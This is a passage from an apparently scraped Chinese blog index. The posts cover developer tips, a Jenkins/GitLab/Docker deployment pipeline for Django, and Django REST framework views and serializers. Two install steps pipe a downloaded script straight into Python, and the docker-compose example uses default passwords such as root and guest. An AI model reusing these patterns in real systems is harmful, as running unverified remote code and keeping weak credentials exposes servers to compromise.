v4.2.0 实际上，branch 可以是 分支，Tag，甚至 commit id。\n切换到新建的分支：\n1 git checkout v4.2.0_docs 查看提交者用户名和邮箱信息：\n1 2 git config user.name git config user.email 将新建的分支推送到远程：\n1 git push origin v4.2.0_docs 4. VirtualBox 配置 Docker 加速器 编辑 .docker\\machine\\machines\\default\\config.json 文件，新增：\n1 2 3 \u0026#34;RegistryMirror\u0026#34;: [ \u0026#34;http://f1361db2.m.daocloud.io\u0026#34; ], 5. pipenv 使用 Pipfile Pipfile 是社区拟定的依赖管理文件，用于替代 requirements.txt。Pipfile.lock 中记录了当前环境中安装的版本号和哈希值。\n安装 1 pip install pipenv 创建环境 1 2 3 4 5 6 7 8 # Python3 pipenv --three # Python2 pipenv --two # 指定版本 pipenv --python 3.6 # 指定解释器 pipenv --python pypy3 这里的解释器，需要已经在本地安装，可以不加入 PATH 环境变量中。\n进入环境 1 pipenv shell ","description":"","id":405,"section":"post","tags":["博文","Tips","Python","MySQL","Git"],"title":"开发 Tips（6）","uri":"https://www.chenshaowen.com/blog/developing-tips-6.html"},{"content":" 大公司的程序员，容易产生的错觉之一就是，误将平台能力当作自己的能力。在大团队，我们不应仅关注自己的一亩三分地，更需要了解平台的各个环节。一方面，有助于更好地利用平台相关特性，另一方面，也为了自我技术更好地成长。本文，介绍了如何使用 Jekins、Docker、GitLab 搭建 Django 自动化开发部署流程。相关工具都是开源、可以拿来即用的。\n1. 开发流程 在生产环境，Web 应用采用的是 K8S 多实例部署，状态服务 MySQL、RabbitMQ 采用的是集群部署。同时，还搭建了监控和日志采集、检索等周边。\n相比较于生产环境，这里的开发流程，我希望能尽量模拟生产环境，但也不需要太完善。毕竟，个人的时间和精力有限，当有需求时，逐步完善是一个不错的选择。\n这里使用 GitLab 作为开发仓库，使用 Jenkins 作为自动化引擎，部署使用的是 Docker 镜像。\n下面是一个简单的部署流程：\n当满足触发条件时，Jenkins 就会自动从 GitLab 拉取代码，制作 Docker 镜像，最终在服务器上运行 Django 实例。这样基本就可以，模拟整个部署流程。\n2. GitLab 配置 选用 GitLab 是因为，其允许创建私有仓库。\n创建仓库 首先得创建一个 GitLab 仓库，例如： ProjectA\n添加远程访问 SSH-KEY 在本地执行命令，生成远程访问需要的 SSH-KSY\n1 ssh-keygen -o -t rsa -b 4096 -C \u0026#34;mail@chenshaowen.com\u0026#34; 在 https://gitlab.com/profile 页面，找到 【SSH Keys】，添加上面生产的 Key 值。\n生成个人仓库访问的 Token 在 https://gitlab.com/profile 页面，找到 【Access Tokens】，完善信息，点击生成 PersonToken。\n3. Jenkins 配置 Jenkins 可以对外直接提供 API ，也支持插件扩展。对于熟悉 Java 的团队，Jenkins 具有很强的吸引力。使用 Jenkins ，可以满足 CI、CD 各种各样的需求。\n这里的 Jenkines 主要用于部署服务。通过接收 GitLab 发送的提交信息，拉取最新的代码，执行脚本，完成部署。\n安装 GitLab 相关插件 这里需要使用到的 Jenkins 插件主要有：\nGitlab Authentication plugin Gitlab Hook Plugin Gitlab Plugin 在 【Jenkins】-\u0026gt; 【插件管理】 里面，搜索并安装插件，重启 Jenkins 生效。\n添加 Gitlab 访问凭据 在 【Jenkins】-\u0026gt; 【凭据】-\u0026gt; 【系统】-\u0026gt; 【全局凭据 (unrestricted)】 中，【添加凭据】 ，类型选择 【Gitlab API token】，API token 即为在第二章节中生成的 PersonToken。\n新建流水线，配置仓库 创建【构建一个自由风格的软件项目】，如上图填入项目 ProjectA 的仓库地址。点击新增 SSH-Key 访问凭证。\n配置 Jenkins 触发规则 如上图，在 【Build Triggers】中，勾选 【Build when a change is pushed to GitLab. GitLab webhook URL:】，获取 GitLab Webhook 地址。点击【Advanced】，生成 Token。\nGitLab 配置 Webhook 上一步中，获取到了两个值，GitLab Webhook 和 Token。\n如上图，在 Gitlab 项目仓库 【Settings】-\u0026gt; 【Integrations】 中填入相关信息。如果你的 Webhook 不是 https 链接，还需要去掉 【Enable SSL verification】 勾选。\nJenkins 构建配置 构建配置实际上就是 Jenkins 拉取仓库代码之后，执行的脚本命令。这里直接执行项目下的 start.sh 脚本，即可。\n4. Docker 镜像制作 使用 Docker 进行部署，有利于打包环境依赖，对服务进行水平扩展。在生产环境中，通常会采用多实例+集群的方式进行部署，以保障服务高可用。\n这里主要使用 docker-compose 编译镜像，编排 Django 运行时需要的容器。\n上图是整个仓库的目录结构，分为四个部分。\n4.1 Django 项目代码 Django 使用的是默认目录结构，有两点需要注意：\n通过环境变量，区分不同环境 在启动时，需要传入一个环境变量，提供给 Django 区分环境。在 settings.py 文件中：\n1 2 3 4 if os.getenv(\u0026#39;Env\u0026#39;) == \u0026#39;Production\u0026#39;: DEBUG = False else: DEBUG = True Django DEBUG=False 模式下，无法转发静态文件，需要配置 WhiteNoise 1 2 3 4 5 6 7 8 STATIC_ROOT = os.path.join(BASE_DIR, \u0026#39;staticfile\u0026#39;) # STATICFILES_DIRS = ( os.path.join(BASE_DIR, \u0026#39;static\u0026#39;), ) WHITENOISE_STATIC_PREFIX = \u0026#39;/static/\u0026#39; MIDDLEWARE.append(\u0026#39;whitenoise.middleware.WhiteNoiseMiddleware\u0026#39;) STATICFILES_STORAGE = \u0026#39;whitenoise.storage.CompressedStaticFilesStorage\u0026#39; 4.2 数据存放 通过卷的形式，将数据目录挂载到 Docker，可以保存运行状态，避免因容器重启而丢失数据。\n4.3 镜像配置 Python 镜像，需要安装基本的依赖包。\nDockerfile 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 FROM python:3.7-alpine RUN apk update \\ \u0026amp;\u0026amp; apk add --no-cache --virtual bash \\ \u0026amp;\u0026amp; apk add gcc \\ \u0026amp;\u0026amp; apk add musl-dev \\ \u0026amp;\u0026amp; apk add linux-headers \\ \u0026amp;\u0026amp; apk add jpeg-dev \\ \u0026amp;\u0026amp; apk add zlib-dev \\ \u0026amp;\u0026amp; apk add mariadb-dev \\ \u0026amp;\u0026amp; apk add libffi-dev COPY requirements.txt /requirements.txt RUN pip install --upgrade pip \\ \u0026amp;\u0026amp; pip install -r requirements.txt \\ \u0026amp;\u0026amp; rm /usr/bin/mysql* RUN mkdir /code WORKDIR /code requirements.txt 文件\n1 2 3 4 5 6 7 8 9 django==2.1.2 gunicorn==19.9.0 mysqlclient==1.3.13 pymysql==0.9.2 whitenoise==4.1.2 celery==4.2.1 django-celery-results==1.0.4 django-celery-beat==1.3.0 redis==2.10.6 MySQL 镜像，用于提供 DB 访问服务。\nDockerfile 文件：\n1 2 FROM mysql:5.7 COPY my.cnf /etc/mysql/conf.d/my.cnf my.cnf 文件：\n1 2 3 4 [mysqld] character-set-server=utf8 [client] default-character-set=utf8 容器编排 这里复用了 Python 镜像，提供 django 和 celery 容器环境。Django 通过 gunicorn 启动。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 version: \u0026#39;2\u0026#39; services: python: build: ./docker/python container_name: django ports: - 7900:7900 volumes: - ./code:/code command: \u0026gt; bash -c \u0026#34;pip install -r requirements.txt \u0026amp;\u0026amp; python manage.py migrate \u0026amp;\u0026amp; python manage.py collectstatic --no-input \u0026amp;\u0026amp; gunicorn news.wsgi -b 0.0.0.0:7900\u0026#34; environment: - Env=Production depends_on: - mysql - redis - rabbitmq - celery - mongo networks: - django-networks mysql: build: ./docker/mysql container_name: mysql ports: - 3306:3306 volumes: - ./data/mysql:/var/lib/mysql environment: - MYSQL_ROOT_PASSWORD=root - MYSQL_DATABASE=news networks: - django-networks redis: image: redis:latest container_name: redis expose: - \u0026#34;6379\u0026#34; networks: - django-networks rabbitmq: image: rabbitmq:3-management container_name: rabbitmq environment: - RABBITMQ_DEFAULT_USER=guest - RABBITMQ_DEFAULT_PASS=guest ports: - \u0026#34;5673:5673\u0026#34; networks: - django-networks celery: build: ./docker/python container_name: celery environment: - Env=Production depends_on: - rabbitmq - mysql volumes: - ./code:/code command: \u0026gt; bash -c \u0026#34;pip install -r requirements.txt \u0026amp;\u0026amp; celery -A news.celery worker -l INFO \u0026amp;\u0026amp; celery -A news.celery beat -l INFO --scheduler django_celery_beat.schedulers:DatabaseScheduler\u0026#34; networks: - django-networks mongo: image: mongo:latest container_name: mongo ports: - \u0026#34;27018:27017\u0026#34; volumes: - ./data/mongo:/data/db networks: - django-networks networks: django-networks: driver: \u0026#34;bridge\u0026#34; start.sh 脚本，用于编译镜像，重启容器。\n1 2 3 4 #!/bin/bash docker-compose build docker-compose stop docker-compose up -d 5. 运行测试 向 Gitlab 仓库提交代码之后，Jenkins 流水线自动触发执行。\n至此，通过 7900 端口就可以访问服务了。如果，需要绑定域名，新增一条 Nginx Server 配置：\n1 2 3 4 5 6 7 8 9 10 11 server { listen 80; server_name yourdomain.com; location / { proxy_pass http://127.0.0.1:7900; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 通过触发 Celery 后台任务，可以确定 Celery、RabbitMQ、MySQL 都能正常提供服务。\n6. 与生成环境的对比 高可用 高并发的关键是无状态，利用集群为状态提供高性能、高可用的服务。这里的 MySQL、RabbitMQ、Redis 都是单实例，生产环境需要采用集群部署。\n另一方面，采用单机单实例部署是十分不可靠的，最好能使用多机多实例部署。\n运行日志 对于线上服务，日志是审计和排查错误的重要信息。使用 ELK + Filebeat 采集不同链路阶段、不同级别的日志，并将其按时间顺序串起来，十分有必要。\n运行隔离 生产环境的一台主机可能会运行很多实例，需要对每个实例使用的资源，CPU、内存、IO 等进行隔离，避免相互影响。\n服务注册 这里我们通过 Nginx 新增一条 Server 配置，来新增一个服务。这里可以，通过 Etcd + Confd 自动化这一流程，可以参考之前的一篇文章。 如果采用 K8S，借助于 Ingress 能实现类似效果。\n监控 生产环境，当然也少不了对各种服务状态的监控和告警。可以使用 Prometheus + Grafana 等开源监控工具，快速搭建监控系统。\n","description":"","id":406,"section":"post","tags":["博文","Django","GitLab","Jenkins","Docker","DevOps"],"title":"如何使用 Jenkins、Docker、GitLab 搭建 Django 自动化部署流程","uri":"https://www.chenshaowen.com/blog/how-to-use-jenkins-docker-gitlab-to-build-django-automated-deployment-process.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Python 内存分析方法 主要涉及四个工具：\nmemory_profile：分析每一行代码的内存使用量 objgraph：跟踪内存中的对象的关系 guppy：在运行时跟踪堆的使用情况 pyrasite：向进程中注入代码 分为两步：\n模拟线上环境，使用 pyrasite 和 guppy 获取堆信息 根据上一步的信息定位到代码中的某一块，再使用 memory_profile 或 objgraph 来进行进一步的分析 2. Docker Machine 基本操作命令 创建 my-vm-name 虚拟机 1 docker-machine create --driver virtualbox my-vm-name 查看全部 docker-machine 1 2 3 4 docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS default * virtualbox Running tcp://192.168.99.101:2376 v18.06.1-ce my-vm-name - virtualbox Running tcp://192.168.99.102:2376 v18.06.1-ce 登录到 docker-machine 1 2 docker-machine ssh default docker@default:~$ 获取 docke-machine 的宿主机 IP 1 2 docker-machine ip default 192.168.99.101 其他命令 1 docker-machine [命令] [主机名] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 active 查看活跃的 Docker 主机 config 输出连接的配置信息 create 创建一个 Docker 主机 env 显示连接到某个主机需要的环境变量 inspect 输出主机更多信息 kill 停止某个主机 regenerate-certs 为某个主机重新生成 TLS 认证信息 restart 重启主机 rm 删除某台主机 ssh SSH 到主机上执行命令 scp 在主机之间复制文件 start 启动一个主机 stop 停止一个主机 upgrade 更新主机 Docker 版本为最新 url 获取主机的 URL 3. 在 Docker Machine 安装软件 在 Windows 或 OS X 上，使用 Docker 需要借助 VirtualBox 基于 Boot2Docker 镜像创建的虚拟机。Boot2Docker 基于 Tiny Linux，提供 tce-load 管理包工具。\n以安装 Python 为例：\n1 2 tce-load -wi python curl https://bootstrap.pypa.io/get-pip.py | sudo python - 可安装软件包列表 tce-load：\nhttp://distro.ibiblio.org/tinycorelinux/tcz_2x.html\ntce-load 命令的文档：\nhttp://wiki.tinycorelinux.net/wiki:tce-load\n4. Docker 命令 启动容器，映射端口格式： hostPort:containerPort 1 2 3 4 5 docker container run \\ -d \\ -p 127.0.0.1:8080:80 \\ --name nginxname \\ nginx 以 shell 的形式登录到容器 1 docker exec -it containerID bash 查看容器的日志 1 docker logs -f containerID 5. Python 多重继承 Python 多重继承调用方法时，采用深度优先搜索算法。按顺序从一个父类一直深度搜索，然后再搜索第二个父类，一直到找到方法为止。\n旧类 旧类查找顺序， C(A, B) =\u0026gt; C -\u0026gt; A -\u0026gt; B\n新类 新类有一个问题就是，任何多重继承的子类都有一个共同的祖类 Object，都是菱形继承。新类的方法是按照 Class.__mro__中储存的类的顺序查找的。\n新类查找顺序， C(A, B) =\u0026gt; C -\u0026gt; A -\u0026gt; B -\u0026gt; Object\n6. 性能测试 - Locust Locust 是开源、使用 Python 开发的性能测试工具。它基于事件、支持分布式，并且提供 Web UI 进行测试执行和结果展示。由于使用的是 gevent 的协程并发机制，在并发量上 Locust 显著优于其他同类工具。\n安装：\n1 pip install locustio 编写一个测试用例：\ntest.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from locust import HttpLocust, TaskSet, task class TestBaiDu(TaskSet): @task def baidu_page(self): self.client.get(\u0026#39;/\u0026#39;) class WebsiteUser(HttpLocust): task_set = TestBaiDu min_wait = 3000 max_wait = 5000 执行测试：\n1 locust -f test.py --host=https://www.baidu.com Web UI 访问，打开链接： http://localhost:8089/\n7. 如何将 MongoDB 注册为 Windows 服务 下载安装之后，将目录 C:\\Program Files\\MongoDB\\Server\\4.0\\bin\\ 加入 PATH。\n以管理员权限执行命令：\n1 mongod.exe --config \u0026#34;C:\\Program Files\\MongoDB\\Server\\4.0\\bin\\mongod.cfg\u0026#34; --install -serviceName \u0026#34;MongoDB\u0026#34; 启动服务 MongoDB:\n1 2 3 C:\\Windows\\system32\u0026gt;net start mongodb mongodb 服务正在启动 .. mongodb 服务已经启动成功。 8. CentOS 编译安装 Python 3.7 安装依赖：\n1 yum install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils libffi-devel 下载源码包：\n1 2 cd /usr/src wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz 开始安装：\n1 2 3 4 tar xzf Python-3.7.0.tgz cd Python-3.7.0 ./configure --enable-optimizations make altinstall 查看版本信息：\n1 python3.7 -V 安装 pip\nwget https://bootstrap.pypa.io/get-pip.py -O - | python3.7 pip3 -V 9. CentOS 7 升级安装 Git2 移除旧版本： 1 yum remove git 安裝 epel-release repository ： 1 yum install epel-release 安裝 IUS repository： 1 yum install https://centos7.iuscommunity.org/ius-release.rpm 安裝 git2u： 1 yum install git2u ","description":"","id":407,"section":"post","tags":["博文","Tips","Python","Docker","CentOS","性能"],"title":"开发 Tips（5）","uri":"https://www.chenshaowen.com/blog/developing-tips-5.html"},{"content":"1. Serializer 1.1 数据校验 在反序列化数据时，需要对数据的合法性进行校验。这时，可以调用 is_valid() 进行验证，如果发生验证错误，可以在 .errors 属性获取错误提示信息。例如：\n1 2 3 4 serializer.is_valid() # False serializer.errors # {\u0026#39;created\u0026#39;: [u\u0026#39;This field is required.\u0026#39;]} .is_valid() 方法带有一个可选的 raise_exception 标志，如果存在验证错误，将抛出 serializers.ValidationError 异常。\n1 serializer.is_valid(raise_exception=True) 除了使用显示申明式的验证规则，还可以通过向 Serializer 子类添加 .validate_\u0026lt;field_name\u0026gt; 方法来指定自定义字段级验证。这与 Django 表单的 .clean_\u0026lt;field_name\u0026gt; 方法类似。\n1 2 3 4 class SnippetSerializer(serializers.Serializer): def validate_title(self, value): # do something return value 还可以自定义验证器，这里不再详细描述。\n1.2 相关方法 Serializer 类继承自 BaseSerializer，有几个方法，可以用于定制序列化行为：\nto_internal_value(self, data)，用于反序列化，写入数据 to_representation(self, instance)，用于序列化，读取数据 update(self, instance, validated_data)，用于更新数据 create(self, validated_data)，用于新增数据 save(self, **kwargs)，保存操作 2. APIView 2.1 相关属性 renderer_classes，渲染器类 parser_classes，解释器类 authentication_classes： 权限类 throttle_classes：节流类 permission_classes： 权限类 content_negotiation_class： 内容协商类 2.2 相关方法 get_renderers(self)，获取渲染器方法 get_parsers(self)，获取解释器方法 get_authenticators(self)，获取认证方法 get_throttles(self)，获取节流方法 get_permissions(self)，获取权限方法 get_content_negotiator(self)，获取内容协商方法 check_permissions(self, request)，检查权限 check_throttles(self, request)，检查节流 check_content_negotiation(self, request, force=False)， 检查内容协商 2.3 调度方法 initial(self, request, *args, **kwargs) 在处理程序方法之前被调用。这个方法是用来执行权限和节流，并执行内容协商。\nhandle_exception(self, exc) 抛出的任何异常处理程序方法将被传递给这个方法，而返回响应实例，或者 raises 异常。\ninitialize_request(self, request, *args, **kwargs) 确保请求对象传递给处理程序方法是 request 的一个实例，而不是 Django 的 HttpRequest。\nfinalize_response(self, request, response, *args, **kwargs) 确保任何响应处理程序方法返回的对象将被呈现到正确的内容类型。\n3. GenericAPIView 3.1 相关属性 queryset 用于返回query对象集合，也可以使用 get_queryset() 方法。\nserializer_class 序列化器类，应该用于输入进行验证和反序列化，并用于序列化输出。通常情况下，你必须设置这个属性，或重写 get_serializer_class() 方法。\nlookup_field，模型的字段应该用于执行对象查找个别的模型实例 lookup_url_kwarg，URL应该用于对象查找关键字参数 pagination_class 用于返回一个分页列表视图的分页类，默认与 settings 中设置的 DEFAULT_PAGINATION_CLASS 值相同，可以通过rest_framework.pagination.PageNumberPagination 设置分页数\n过滤器属性。\nfilter_backends，过滤 queryset 的类列表，和在 settings 中设置 DEFAULT_FILTER_BACKENDS 一样 3.2 基本方法 get_queryset()，返回queryset get_object()，获取某一个具体的 Model 实例对象 以下方法是 mixins 类提供，提供简单的对象保存和删除的行为重写：\nperform_create(self, serializer)，CreateModelMixin 保存对象时调用 perform_update(self, serializer)，UpdateModelMixin 更新对象时调用 perform_destroy(self, instance)，DestoryModelMixin 删除对象时调用 4 ModelViewSet GenericViewSet 是对 GenericAPIView 的继承。ModelViewSet 又是对 GenericViewSet 和大量 mixins 的组合。\nrest_framework/viewsets.py 定义了 ModelViewSet 类：\n1 2 3 4 5 6 7 8 9 10 11 class ModelViewSet(mixins.CreateModelMixin, mixins.RetrieveModelMixin, mixins.UpdateModelMixin, mixins.DestroyModelMixin, mixins.ListModelMixin, GenericViewSet): \u0026#34;\u0026#34;\u0026#34; A viewset that provides default `create()`, `retrieve()`, `update()`, `partial_update()`, `destroy()` and `list()` actions. \u0026#34;\u0026#34;\u0026#34; pass 在使用过程中，通常需要继承 ModelViewSet 实现自己的业务逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 class YourViewSet(viewsets.ModelViewSet): def list(self, request): pass def create(self, request): pass def retrieve(self, request, pk=None): pass def update(self, request, pk=None): pass def partial_update(self, request, pk=None): pass def destroy(self, request, pk=None): pass 下面是前端 URL 请求与 ModelViewSet 方法的对应关系：\nlist() ，GET 方法，/date-list/ create() ，POST，/date-list/ retrieve() ，GET，/date-list/\u0026lt;id\u0026gt;/ update()，PUT，/date-list/\u0026lt;id\u0026gt;/ partial_update()，PATCH, /date-list/\u0026lt;id\u0026gt;/ destroy()，DELETE，/date-list/\u0026lt;id\u0026gt;/ ","description":"","id":408,"section":"post","tags":["博文","Django","API","接口"],"title":"restframework 中 Serializer 和 ViewSet 的 API","uri":"https://www.chenshaowen.com/blog/api-of-viewset-and-serializer-in-rest-framework.html"},{"content":"1. Django 中的 View Class 首先回忆一下，Django 对请求的处理逻辑。收到一次请求之后，Django 会生成一个 WSGIHandler 类型的 handler，由 handler 控制整个处理流程。\n那么，请求的 URL 与 View 是如何关联的呢？\nDjango 首先根据 ROOT_URLCONF 的配置加载 URLconf，按顺序逐个匹配 URLconf 的 URLpatterns，匹配即停止。 然后，将 HttpRequest 对象作为参数，调用 URLpatterns 的 view 函数。\n再来看看，类视图路由的配置方法：\n1 2 3 4 5 6 from django.conf.urls import url from myapp import views urlpatterns = [ url(r\u0026#39;^fruit/\u0026#39;, views.FruitView.as_view()), ] django/views/generic/base.py 定义了 View 类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class View(object): @classonlymethod def as_view(cls, **initkwargs): ... def view(request, *args, **kwargs): self = cls(**initkwargs) if hasattr(self, \u0026#39;get\u0026#39;) and not hasattr(self, \u0026#39;head\u0026#39;): self.head = self.get self.request = request self.args = args self.kwargs = kwargs return self.dispatch(request, *args, **kwargs) ... return view def dispatch(self, request, *args, **kwargs): if request.method.lower() in self.http_method_names: handler = getattr(self, request.method.lower(), self.http_method_not_allowed) else: handler = self.http_method_not_allowed return handler(request, *args, **kwargs) 通过调用 as_view() 方法，将返回 dispatch() 函数给路由函数。\ndispatch() 函数，会根据请求的方法，在 View 类中调用与请求方法同名的函数。\n这样，处理逻辑就非常清楚了。相较于函数视图，类视图多了 dispatch 这一步骤，可以理解为二次路由。\n2. restframework 中的 View Class restframwork 继承 Django View，实现了三个层级的 View，分别是 APIView、GenericAPIView、GenericViewSet。下面，我们来逐个分析。\n2.1 APIView rest_framewor/views.py 定义了 APIView 类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from rest_framework.request import Request class APIView(View): renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES authentication_classes = api_settings.DEFAULT_AUTHENTICATION_CLASSES throttle_classes = api_settings.DEFAULT_THROTTLE_CLASSES permission_classes = api_settings.DEFAULT_PERMISSION_CLASSES ... def initial(self, request, *args, **kwargs): self.perform_authentication(request) self.check_permissions(request) self.check_throttles(request) def dispatch(self, request, *args, **kwargs): request = self.initialize_request(request, *args, **kwargs) self.request = request try: self.initial(request, *args, **kwargs) handler = getattr(self, request.method.lower(), self.http_method_not_allowed) response = handler(request, *args, **kwargs) except Exception as exc: response = self.handle_exception(exc) self.response = self.finalize_response(request, response, *args, **kwargs) return self.response 在 initial 函数中，会校验接口的版本、认证授权、权限验证、访问频率等。同时，restframework 对 request 进行了再次封装。\n在使用上 restframework 的 APIView 与 Django View 差别不大，但是对 View 提供的功能进行了增强。\n2.2 GenericAPIView rest_framework/generics.py 定义了 GenericAPIView 类：\n1 2 3 4 5 6 7 8 9 class GenericAPIView(views.APIView): queryset = None serializer_class = None lookup_field = \u0026#39;pk\u0026#39; lookup_url_kwarg = None filter_backends = api_settings.DEFAULT_FILTER_BACKENDS pagination_class = api_settings.DEFAULT_PAGINATION_CLASS def get_queryset(self): ... GenericAPIView 继承自 APIView，新增了一些类方法：\nget_queryset，获取 QuerySet get_object，获取单条数据 get_serializer，获取序列化后的数据 get_serializer_class，获取需要序列化的model类 get_serializer_context，获取序列化的数据，定义了某种格式的字典 paginator，分页器 除了直接继承 GenericAPIView 实现 View Class，restframework 还提供了大量 mixins。通过继承 mixins，可以快速组合需要的操作。请看下面这个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from rest_framework import mixins from rest_framework import generics class BookView(mixins.ListModelMixin, mixins.CreateModelMixin, generics.GenericAPIView): queryset = Book.objects.all() serializer_class = BookSerializers def get(self, request, *args, **kwargs): return self.list(request, *args, **kwargs) def post(self, request, *args, **kwargs): return self.create(request, *args, **kwargs) 更多 mixins：\nmixins 功能 对应的 HTTP 请求方法 mixins.ListModelMixin 定义 list 方法，返回一个 querylist 的列表 GET mixins.CreateModelMixin 定义 create 方法，创建一个示例 POST mixins.RetrieveModelMixin 定义 retrieve 方法，返回一个具体的示例 GET mixins.UpdateModelMixin 定义 update 方法，对某个实例进行更新 PUT/PATCH mixins.DestroyModelMixin 定义 delete 方法，删除某个实例 DELETE 2.4 GenericViewSet GenericAPIView 提供了增、删、改、查等基本操作，可以用于快速开发 API。但，如果需要对这些操作进行组合，实现复杂的业务逻辑时，可能就不那么方便了。\n幸运的是，restframework 提供了 GenericViewSet，用于更复杂的业务逻辑处理。\nrest_framework/viewsets.py 中定义了 GenericAPIView 类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class ViewSetMixin(object): @classonlymethod def as_view(cls, actions=None, **initkwargs): def view(request, *args, **kwargs): self = cls(**initkwargs) for method, action in actions.items(): handler = getattr(self, action) setattr(self, method, handler) if hasattr(self, \u0026#39;get\u0026#39;) and not hasattr(self, \u0026#39;head\u0026#39;): self.head = self.get return self.dispatch(request, *args, **kwargs) view.cls = cls view.initkwargs = initkwargs view.suffix = initkwargs.get(\u0026#39;suffix\u0026#39;, None) view.actions = actions return csrf_exempt(view) class GenericViewSet(ViewSetMixin, generics.GenericAPIView): pass 内置的 ViewSet 有 5 种，分别是\nViewSetMixin ViewSet GenericViewSet ReadOnlyModelViewSet ModelViewSet 有两种方式，可以将 ViewSet 绑定到指定的 URL 上：\n手动将 ViewSet 绑定到 URL 在 urls.py 中，新增：\n1 2 3 4 5 6 7 8 9 from .views import SnippetViewSet snippet_list = SnippetViewSet.as_view({ \u0026#39;get\u0026#39;: \u0026#39;list\u0026#39;, \u0026#39;post\u0026#39;: \u0026#39;create\u0026#39; }) urlpatterns = [ url(r\u0026#39;^snippets/$\u0026#39;, snippet_list, name=\u0026#39;snippet-list\u0026#39;), 将 snippets/ 路径下，get 请求方法，分发到 list 函数；post 请求方法，分发到 create 方法。\n使用 restframework 提供的 routers 在 urls.py 中，新增：\n1 2 3 4 5 6 7 8 9 from rest_framework.routers import DefaultRouter from .views import SnippetViewSet router = DefaultRouter() router.register(r\u0026#39;snippets\u0026#39;, SnippetViewSet) urlpatterns = [ url(r\u0026#39;^\u0026#39;, include(router.urls)), ] 3. Serializer restframework 中的 Serializer 和 ModelSerializer 与 Django 的 Form 和 ModelForm 类似。\n3.1 Serializer 1 2 3 4 5 from rest_framework import serializers class CommentSerializer(serializers.Serializer): email = serializers.EmailField() content = serializers.CharField(max_length=200) 序列化：对象 -\u0026gt; Json 1 2 3 serializer = CommentSerializer(comment) serializer.data {\u0026#39;email\u0026#39;: \u0026#39;mail@example.com\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;foo bar\u0026#39;} 反序列化：String -\u0026gt; Json 1 2 3 4 5 serializer = CommentSerializer(data=data) serializer.is_valid() True serializer.validated_data {\u0026#39;content\u0026#39;: \u0026#39;foo bar\u0026#39;, \u0026#39;email\u0026#39;: \u0026#39;mail@example.com\u0026#39; 还可以用于验证，提交的数据是否符合合法：\n1 2 3 serializer = SnippetSerializer(data=request.data) if serializer.is_valid(): pass 3.2 ModelSerializer 相较与上面一个字段一个字段的声明，ModelSerializer 可以快速建立相关模型的 serializer 模型。提供如下特性：\n自动产生基于模型的 fileds 自动产生验证器，比如 unique_together 验证器 默认包含 create 和 update 方法 外键被映射为 PrimaryKeyRelatedField 1 2 3 4 5 6 from .models import Snippet class SnippetSerializer(serializers.ModelSerializer): class Meta: model = Snippet fields = (\u0026#39;id\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;code\u0026#39;, \u0026#39;linenos\u0026#39;, \u0026#39;language\u0026#39;, \u0026#39;style\u0026#39;) 4. 参考 http://www.ziawang.com/article/302/ https://q1mi.github.io/Django-REST-framework-documentation/tutorial/quickstart_zh/ https://blog.csdn.net/l_vip/article/details/79131289 https://darkcooking.gitbooks.io/django-rest-framework-cn/content/chapter0.html http://www.cnblogs.com/renpingsheng/p/7892719.html https://whatwewant.gitbooks.io/django-rest-framework-tutorial-cn/content/1.Serialization.html ","description":"","id":409,"section":"post","tags":["博文","Django","API","框架","接口"],"title":"restframework 中的 Viewset 和 Serializer","uri":"https://www.chenshaowen.com/blog/viewset-and-serializer-in-rest-framework.html"},{"content":" 由于数据量剧增，系统响应很慢。对应用系统进行了一系列的优化工作，系统响应时间得到了数量级级别的优化效果。总体看，在压缩文件、加快网络访问方面的优化，对前端性能有显著提升效果。在存储过程、缓存、逻辑代码方面的优化，对后端性能提升有显著效果。本文整理了优化思路和方法。\n1. 梳理链路 在优化之前，梳理整个链路尤为重要。\n优化是一个系统工程，不能经过简单地增减就取得很好的效果。同时，并不是我们故意将系统设计得慢，而是设计系统的前提条件发生了变化，需要审视整个系统。优化就是要找出这些变化，并让系统适应这种变化。\n下图，是对整个系统链路的梳理：一个接入层，一个逻辑层，一个存储层。\n2. 项目背景和优化思路 这是一个商城 + 社区论坛的 Web 应用，还有小程序端。不仅要支撑商品的发布、更新、交易、日常运营，还需要支撑用户社区问答、关注点赞等社交功能。由于某些历史原因，系统的数据表多达 142 张。\n一句话描述，就是大而杂。同时，开发人员只有一个前端，一个后端。\n项目采用前后端分离的模式进行开发，优化时，也是顺着这个思路。前后端分别，先借助一定的分析工具，找到链路上耗时的节点，再进行优化。\n下面是一些已经采取或即将采取的优化措施。\n3. 前端 3.1 根据 PageSpeed Insights 分析优化 PageSpeed Insights 是由 Google 开发的网站分析和优化工具。有网页版，也有 Google Chrome 插件版 。\n安装插件版之后，通过 F12 打开开发者工具，点击 【ANALYZE】。将会看到 PageSpeed 对页面的打分和修改意见。\n点击每一项意见，会显示更详细的内容。PageSpeed Insight 的分析包含以下几个方面：\n优化缓存——让你应用的数据和逻辑完全避免使用网络 减少回应时间——减少一连串请求-响应周期的数量 减小请求大小——减少上传大小 减小有效负荷大小——减小响应、下载和缓存页面的大小 优化浏览器渲染——改善浏览器的页面布局 3.2 CDN 托管静态文件 CDN 